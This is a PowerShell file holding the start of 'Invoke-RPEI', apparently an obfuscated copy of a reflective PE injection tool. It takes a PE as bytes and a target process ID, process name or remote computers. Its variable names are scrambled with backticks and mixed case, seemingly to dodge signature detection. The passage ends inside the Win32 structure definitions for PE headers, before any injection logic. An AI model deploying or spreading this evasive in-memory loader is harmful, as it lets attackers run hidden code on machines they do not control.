function Invoke-RPEI
{

[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseSingularNouns', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSPossibleIncorrectComparisonWithNull', '')]
[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = ${T`RUE})]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    ${p`E`BYtEs},

    [Parameter(Position = 1)]
    [String[]]
    ${C`OM`pUTEr`NAmE},

    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
    [String]
    ${f`Un`cRe`TUrntypE} = 'Void',

    [Parameter(Position = 3)]
    [String]
    ${e`xe`ArgS},

    [Parameter(Position = 4)]
    [Int32]
    ${prOC`Id},

    [Parameter(Position = 5)]
    [String]
    ${p`ROCna`me},

    [Switch]
    ${fOR`C`E`ASlR},

    [Switch]
    ${do`NOtze`R`omz}
)

Set-StrictMode -Version 2


${R`emOt`eSCr`Ipt`BlocK} = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${t`Rue})]
        [Byte[]]
        ${Pe`By`TEs},

        [Parameter(Position = 1, Mandatory = ${tr`UE})]
        [String]
        ${fUn`creTUR`NType},

        [Parameter(Position = 2, Mandatory = ${t`RuE})]
        [Int32]
        ${p`ROCId},

        [Parameter(Position = 3, Mandatory = ${Tr`Ue})]
        [String]
        ${pR`OcNa`me},

        [Parameter(Position = 4, Mandatory = ${tR`UE})]
        [Bool]
        ${F`O`RC`EASLR}
    )

    
    
    
    Function Get-Win32Types
    {
        ${wI`N32T`YpES} = New-Object System.Object

        
        
        ${DOm`AIN} = [AppDomain]::CurrentDomain
        ${D`yNa`miCAs`sEMb`lY} = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        ${asSE`MbLy`Bui`LdER} = ${D`omAiN}.DefineDynamicAssembly(${Dy`NAM`Ica`S`SEMblY}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        ${MO`DU`LebUi`lder} = ${Ass`emblyBu`il`deR}.DefineDynamicModule('DynamicModule', ${F`AlSe})
        ${c`oNSt`RUcT`oR`InFO} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        
        
        ${tY`pEB`U`iLDEr} = ${m`ODU`l`EbUIld`ER}.DefineEnum('MachineType', 'Public', [UInt16])
        ${tYPE`Bu`Ild`er}.DefineLiteral('Native', [UInt16] 0) | Out-Null
        ${TYpeB`U`ILdeR}.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        ${TYPEbU`I`l`deR}.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        ${tYPEBuI`l`D`er}.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        ${M`Ac`h`ineTYPe} = ${ty`peB`UiL`der}.CreateType()
        ${wiN32`T`YpES} | Add-Member -MemberType NoteProperty -Name MachineType -Value ${MAcH`IN`etype}

        
        ${t`ypebuiL`der} = ${moduleB`U`ILDEr}.DefineEnum('MagicType', 'Public', [UInt16])
        ${T`YP`EbUILDEr}.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        ${TYPe`BU`I`LdER}.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        ${m`AgIcTy`pE} = ${tyPeb`U`I`lDer}.CreateType()
        ${wI`N`32TYpeS} | Add-Member -MemberType NoteProperty -Name MagicType -Value ${Magict`y`Pe}

        
        ${tYPEbU`i`LdER} = ${m`od`UL`EBuIld`ER}.DefineEnum('SubSystemType', 'Public', [UInt16])
        ${ty`peb`UILd`Er}.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        ${Ty`pebU`I`ldER}.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        ${TY`p`eBUI`LdEr}.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        ${Typ`eb`Ui`ldEr}.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        ${t`YpeBuI`LDer}.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        ${TYP`e`BuiL`DER}.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        ${tYP`e`BUi`LDER}.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        ${TYPEb`U`ILd`er}.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        ${TyP`e`BUILdEr}.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        ${T`YPe`BuILD`eR}.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        ${T`Y`PEBuIL`dER}.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        ${subSySteMT`Y`pe} = ${T`yp`EB`UildER}.CreateType()
        ${wi`N32T`Ypes} | Add-Member -MemberType NoteProperty -Name SubSystemType -Value ${S`U`BSYs`Temtype}

        
        ${typEBu`i`lDer} = ${m`oDulE`B`U`ILDer}.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        ${T`YPeBUI`L`DER}.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        ${T`yPeBuI`LdER}.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        ${T`Yp`ebUIl`DeR}.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        ${T`YPeBu`ILder}.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        ${Typ`ebu`I`LdeR}.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        ${TYPe`Bu`ILdEr}.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        ${T`YPeBu`ild`ER}.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        ${Type`BU`iLDEr}.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        ${ty`pEb`Uilder}.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        ${TyP`e`Bui`lder}.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        ${T`YpEBU`ildeR}.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        ${T`ypEbUI`lD`er}.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        ${typ`Eb`UILD`Er}.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        ${D`LL`c`hARACTeRi`S`TiCstYPe} = ${t`yPEB`UiL`dER}.CreateType()
        ${W`iN3`2tY`Pes} | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value ${dLl`CHAR`ACTeRI`sTicstY`pE}

        
        
        ${at`TriB`Ut`Es} = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        ${tY`Pe`BUilder} = ${mO`DUL`EBUiL`DER}.DefineType('IMAGE_DATA_DIRECTORY', ${ATtRIBu`T`Es}, [System.ValueType], 8)
        (${Ty`PE`BuI`LDER}.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        (${Typ`eBUi`LDER}.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ${ImA`GE_Data_`D`I`ReCt`Ory} = ${t`Y`PEb`UilDer}.CreateType()
        ${wi`N32TY`Pes} | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value ${imAge_DAtA`_`d`I`RecTo`Ry}

        
        ${aTtRi`B`U`TES} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${T`ypebUi`ld`er} = ${mOd`ULEbui`lD`ER}.DefineType('IMAGE_FILE_HEADER', ${atTri`B`UT`eS}, [System.ValueType], 20)
        ${TYpebUI`lD`er}.DefineField('Machine', [UInt16], 'Public') | Out-Null
        ${type`B`U`ILDer}.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        ${t`yP`eBUiLD`er}.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        ${tYp`eBUi`LDer}.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        ${tYpebu`i`lDeR}.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        ${tY`PebUi`lD`Er}.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        ${typE`BuilD`Er}.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        ${IMaGE_fIl`E_h`E`Ader} = ${tYPEBuil`d`ER}.CreateType()
        ${w`i`N3`2TYpeS} | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value ${iMa`Ge`_Fi`lE`_hEad`ER}

        
        ${a`TTrIBU`TES} = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        ${TY`peBU`ildER} = ${moDulE`B`UIl`der}.DefineType('IMAGE_OPTIONAL_HEADER64', ${A`TTr`IB`UTEs}, [System.ValueType], 240)
        (${TYpEb`Ui`LD`eR}.DefineField('Magic', ${ma`gIC`TypE}, 'Public')).SetOffset(0) | Out-Null
        (${tYpEB`U`IlDEr}.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        (${typEb`UILD`Er}.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        (${T`Y`pEBUIL`deR}.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        (${TypEb`U`IL`DEr}.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        (${ty`P`EBUilD`er}.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        (${ty`Pe`B`UilDER}.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        (${T`YpebUI`lDer}.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        (${tYPEBu`il`dER}.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        (${T`YPEBUI`LdEr}.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        (${TYPEB`U`il`DER}.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        (${T`yPebuiLd`ER}.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        (${T`yP`eBuIlD`eR}.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        (${T`YpeBUiL`der}.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        (${tY`pEbUI`ldER}.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        (${tYp`eBui`lDeR}.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        (${tyPeb`UI`Lder}.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        (${TyPebu`il`d`Er}.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        (${ty`PE`BU`ildeR}.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        (${TyP`eBui`ldER}.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        (${ty`PebU`ild`er}.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        (${typ`e`Builder}.DefineField('Subsystem', ${suBS`YstEM`T`Y`pE}, 'Public')).SetOffset(68) | Out-Null
        (${tYP`E`B`UiLdER}.DefineField('DllCharacteristics', ${dL`LChaRa`cTe`RIsT`ICS`TY`pE}, 'Public')).SetOffset(70) | Out-Null
        (${tY`pEBui`l`der}.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        (${tYP`ebu`ILDER}.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        (${t`YpEbUi`LDeR}.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        (${tYpEbuI`l`der}.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        (${tY`Pe`BUILdEr}.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        (${TY`pEbUIlD`eR}.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        (${T`y`Pebu`ilDER}.DefineField('ExportTable', ${IMa`ge_dA`T`A_Di`Recto`RY}, 'Public')).SetOffset(112) | Out-Null
        (${tY`Pe`Bui`ldER}.DefineField('ImportTable', ${iMaGE_DATA_di`R`E`ctORy}, 'Public')).SetOffset(120) | Out-Null
        (${tyPEb`UIlD`ER}.DefineField('ResourceTable', ${i`MA`g`e_dAtA_DI`REc`TORy}, 'Public')).SetOffset(128) | Out-Null
        (${TYpeb`UiL`DeR}.DefineField('ExceptionTable', ${i`MAgE_`D`Ata_`D`iRECtORy}, 'Public')).SetOffset(136) | Out-Null
        (${T`YpEbUI`lDEr}.DefineField('CertificateTable', ${IMAgE`_`daTA_DireCtO`RY}, 'Public')).SetOffset(144) | Out-Null
        (${tY`Peb`UI`LDEr}.DefineField('BaseRelocationTable', ${IM`Ag`e_`DATa`_D`IreC`TOry}, 'Public')).SetOffset(152) | Out-Null
        (${tYpeBuIl`d`Er}.DefineField('Debug', ${i`MAG`e_DAt`A_`diRectOrY}, 'Public')).SetOffset(160) | Out-Null
        (${tYpEb`U`ilDER}.DefineField('Architecture', ${I`MAG`e`_data_Di`RectOry}, 'Public')).SetOffset(168) | Out-Null
        (${t`yP`E`BUILDER}.DefineField('GlobalPtr', ${I`maGE_DA`Ta_diR`EctORy}, 'Public')).SetOffset(176) | Out-Null
        (${tY`Pebu`ILd`eR}.DefineField('TLSTable', ${I`mAgE_`DAta_D`i`RE`cTO`Ry}, 'Public')).SetOffset(184) | Out-Null
        (${TYP`E`BuI`LdER}.DefineField('LoadConfigTable', ${IM`AgE_d`At`A_dIr`eCtorY}, 'Public')).SetOffset(192) | Out-Null
        (${Typ`eBU`ilDEr}.DefineField('BoundImport', ${IMAG`e_dATa`_`d`IrEcT`oRY}, 'Public')).SetOffset(200) | Out-Null
        (${tY`p`ebuil`Der}.DefineField('IAT', ${ImA`ge`_datA_D`IREc`TorY}, 'Public')).SetOffset(208) | Out-Null
        (${TypEbui`L`deR}.DefineField('DelayImportDescriptor', ${imaG`E_d`A`TA_Di`REcTORy}, 'Public')).SetOffset(216) | Out-Null
        (${TY`pEBuiL`d`ER}.DefineField('CLRRuntimeHeader', ${iMa`gE`_dAta_Dir`e`cT`ory}, 'Public')).SetOffset(224) | Out-Null
        (${ty`PeBUIl`D`er}.DefineField('Reserved', ${i`maGe_D`Ata`_diReCtOrY}, 'Public')).SetOffset(232) | Out-Null
        ${iMA`g`e_o`PtioNa`L_h`EaD`er64} = ${ty`peBu`iLdER}.CreateType()
        ${Wi`N3`2tYPes} | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value ${ImA`ge_`OPT`IoNa`l_He`A`der64}

        
        ${a`T`TRIButeS} = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        ${typ`Eb`U`ilDER} = ${m`O`D`ULEbuildEr}.DefineType('IMAGE_OPTIONAL_HEADER32', ${aT`TRIb`U`Tes}, [System.ValueType], 224)
        (${t`ype`B`UiLDER}.DefineField('Magic', ${m`AG`icTYpe}, 'Public')).SetOffset(0) | Out-Null
        (${typeBUIl`D`er}.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        (${Ty`pEBUIld`eR}.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        (${ty`Peb`Ui`LDEr}.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        (${Ty`P`EB`UIlder}.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        (${T`YPeB`UI`ldeR}.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        (${TyPe`B`UiLd`er}.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        (${tyPE`Bui`LDer}.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        (${tyPEbU`I`Lder}.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        (${tYpeBU`ILD`ER}.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        (${Typ`eBuIl`d`ER}.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        (${t`Ypebu`i`lDer}.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        (${tY`Pe`BUIldEr}.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        (${T`y`peBU`ilDEr}.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        (${TypebU`Il`DeR}.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        (${T`y`PebuILd`er}.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        (${tyPE`BUIld`eR}.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        (${TY`pe`Bu`Ilder}.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        (${T`yPEbU`I`ldEr}.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        (${tY`P`ebuIlDEr}.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        (${TypE`BU`iLd`er}.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        (${t`yP`e`BUILdER}.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        (${tyP`EBuiLd`Er}.DefineField('Subsystem', ${sUbsYs`TE`mT`y`PE}, 'Public')).SetOffset(68) | Out-Null
        (${TyPe`BU`iL`DER}.DefineField('DllCharacteristics', ${d`LlCH`ARacTeRi`S`TiCStYPE}, 'Public')).SetOffset(70) | Out-Null
        (${TYP`EbUil`d`er}.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        (${typEB`UILD`ER}.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        (${tyPEbU`i`l`DEr}.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        (${tYp`Ebu`ild`ER}.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        (${tyP`e`B`Uilder}.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        (${t`Y`pEBuiLd`er}.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        (${t`yPe`BuILd`er}.DefineField('ExportTable', ${ImA`ge_dAta`_d`i`R`ecT`OrY}, 'Public')).SetOffset(96) | Out-Null
        (${TYPEbuI`l`dER}.DefineField('ImportTable', ${i`MaGE_`da`TA_`dIR`ecTo`RY}, 'Public')).SetOffset(104) | Out-Null
        (${tyP`e`BU`iLDeR}.DefineField('ResourceTable', ${Im`A`ge_da`TA_`DirEcto`RY}, 'Public')).SetOffset(112) | Out-Null
        (${t`yPEBU`IlD`ER}.DefineField('ExceptionTable', ${iM`Ag`E`_dAtA_diR`E`c`TORy}, 'Public')).SetOffset(120) | Out-Null
        (${TY`PEBUiLd`Er}.DefineField('CertificateTable', ${IM`AgE_d`ATa_di`RECT`orY}, 'Public')).SetOffset(128) | Out-Null
        (${T`y`peb`UIldEr}.DefineField('BaseRelocationTable', ${I`M`Age`_dA`Ta_di`Rec`ToRY}, 'Public')).SetOffset(136) | Out-Null
        (${TY`p`eb`UILdEr}.DefineField('Debug', ${imAge_d`A`T`A_DireCt`oRY}, 'Public')).SetOffset(144) | Out-Null
        (${t`yP`Eb`UiLdeR}.DefineField('Architecture', ${Ima`ge_Da`T`A`_`dIrEct`Ory}, 'Public')).SetOffset(152) | Out-Null
        (${Typ`E`Bui`LdeR}.DefineField('GlobalPtr', ${im`AgE_DatA_`d`IR`ECTorY}, 'Public')).SetOffset(160) | Out-Null
        (${typEBuI`lD`er}.DefineField('TLSTable', ${I`MaGE_`Data_DiRECTo`Ry}, 'Public')).SetOffset(168) | Out-Null
        (${TY`peBu`IlD`Er}.DefineField('LoadConfigTable', ${Im`AG`e_DaTA_`DireC`TOrY}, 'Public')).SetOffset(176) | Out-Null
        (${T`yp`eB`UILDeR}.DefineField('BoundImport', ${imAgE`_d`AT`A`_dIREcto`Ry}, 'Public')).SetOffset(184) | Out-Null
        (${typ`ebUi`LDeR}.DefineField('IAT', ${ImAg`E_`dATa`_D`irECtOry}, 'Public')).SetOffset(192) | Out-Null
        (${T`Y`PEbu`ILDER}.DefineField('DelayImportDescriptor', ${I`MAGe`_dAT`A_direCTory}, 'Public')).SetOffset(200) | Out-Null
        (${TyP`eBuild`er}.DefineField('CLRRuntimeHeader', ${IMaGE`_DATA_`di`REC`TO`RY}, 'Public')).SetOffset(208) | Out-Null
        (${T`YPE`BuiLD`er}.DefineField('Reserved', ${image_DAT`A_`DiRECTO`RY}, 'Public')).SetOffset(216) | Out-Null
        ${imAGE_OP`TIo`Nal_`hea`D`eR32} = ${tyP`E`BUIL`DeR}.CreateType()
        ${w`IN32`TYPeS} | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value ${IMAgE_o`P`TioNAL_HeAd`E`R32}

        
        ${atT`Ri`BUT`eS} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${tYp`ebU`il`deR} = ${MODUl`EBui`LD`ER}.DefineType('IMAGE_NT_HEADERS64', ${aT`T`RiBUtES}, [System.ValueType], 264)
        ${ty`peBuilD`er}.DefineField('Signature', [UInt32], 'Public') | Out-Null
        ${T`YPeBu`ILD`er}.DefineField('FileHeader', ${iMAg`E`_fIle`_HEAd`Er}, 'Public') | Out-Null
        ${ty`PEB`UiLDer}.DefineField('OptionalHeader', ${IMA`ge_opt`iON`A`l_Hea`De`R64}, 'Public') | Out-Null
        ${IMag`E`_N`T`_HeADE`Rs64} = ${typEBU`I`L`der}.CreateType()
        ${wiN`32`TY`PeS} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value ${IM`AG`E_`Nt_heA`deRS64}

        
        ${A`TtR`i`BuTEs} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${TyPeb`U`i`lDeR} = ${M`ODUL`EbuIL`dER}.DefineType('IMAGE_NT_HEADERS32', ${at`Tr`IBU`Tes}, [System.ValueType], 248)
        ${t`YPeBu`iLdeR}.DefineField('Signature', [UInt32], 'Public') | Out-Null
        ${TypEb`U`iLdEr}.DefineField('FileHeader', ${ImAgE_fi`Le`_`HeAd`Er}, 'Public') | Out-Null
        ${tY`PEbuI`LDEr}.DefineField('OptionalHeader', ${Im`AGe_opTIOn`Al`_`hEa`d`Er32}, 'Public') | Out-Null
        ${i`mA`g`E_n`T_hEad`E`Rs32} = ${TYPEBUIl`D`Er}.CreateType()
        ${wIn3`2`Types} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value ${I`MAgE`_nt`_`hEADERs32}

        
        ${aTT`RI`ButES} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${ty`pE`BuiLDeR} = ${ModulE`BU`I`lDER}.DefineType('IMAGE_DOS_HEADER', ${ATtriB`U`T`Es}, [System.ValueType], 64)
        ${Ty`pEBuIl`d`eR}.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        ${TYpE`BuIl`dER}.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        ${TY`peBUIL`D`eR}.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        ${TY`Peb`UIl`DEr}.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        ${Typ`eB`U`ILdEr}.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        ${TyP`EBU`IlD`eR}.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        ${tYpeB`UilD`er}.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        ${Ty`peBU`iL`DEr}.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        ${t`y`pe`BuIlDER}.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        ${T`Yp`E`BuiLdEr}.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        ${tY`pebUi`LD`eR}.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        ${T`yP`eBuILD`Er}.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        ${t`yPeb`UiLDEr}.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        ${TYPEB`Uil`D`eR}.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        ${E_r`e`SF`Ield} = ${t`yPe`BUil`DeR}.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        ${cOnst`RUc`ToRva`lue} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        ${f`iel`daRRAy} = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        ${A`T`Tr`iBbUiLd`er} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${Co`Nst`Ru`CtO`RInfo}, ${cO`NST`Ru`CtorVALUE}, ${fi`e`lDARR`Ay}, @([Int32] 4))
        ${E`_R`EsfIEld}.SetCustomAttribute(${AtTri`BB`UIlDeR})

        ${T`Y`pEbui`LDER}.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        ${ty`peB`UiL`DER}.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        ${e_`RES2`FI`ELd} = ${t`YpEBui`LD`ER}.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        ${C`Onst`R`U`CtORVa`luE} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        ${A`TTRIbbu`IlD`Er} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${Co`Nst`Ru`ctO`Ri`NFo}, ${CONS`TR`U`cTOrvaluE}, ${fi`EL`dArraY}, @([Int32] 10))
        ${e_`R`ES2F`IeLD}.SetCustomAttribute(${AttRiBbui`L`der})

        ${TYpeBU`IL`d`eR}.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        ${iMaG`E_`dOS_H`eAd`er} = ${TY`P`EbUIL`Der}.CreateType()
        ${WI`N32Ty`pes} | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value ${IM`AG`e_DO`S_hEa`dEr}

        
        ${a`TTR`iBu`TES} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${tYp`EbuI`ldEr} = ${m`O`DuL`eBU`ilder}.DefineType('IMAGE_SECTION_HEADER', ${a`TTrIBU`TeS}, [System.ValueType], 40)

        ${NAMEFi`e`lD} = ${typ`ebuI`L`Der}.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        ${C`o`NStRuct`o`RvALue} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        ${at`TRIBB`UiL`D`ER} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${cON`STRUCT`oRi`NFo}, ${coNs`TRuCTo`R`VaLUe}, ${FIeLD`Ar`R`AY}, @([Int32] 8))
        ${Na`mEF`IELd}.SetCustomAttribute(${a`TT`RIBBuILD`er})

        ${TyP`EBuil`D`er}.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        ${TypE`BUiLD`Er}.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        ${typE`BuiLD`Er}.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        ${TYP`eB`U`iLDEr}.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        ${t`y`PEBUIlD`Er}.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        ${t`YPEB`Ui`Lder}.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        ${TYpEBUI`L`DeR}.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        ${tYPE`BuilD`eR}.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        ${tyP`E`BuIlD`eR}.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
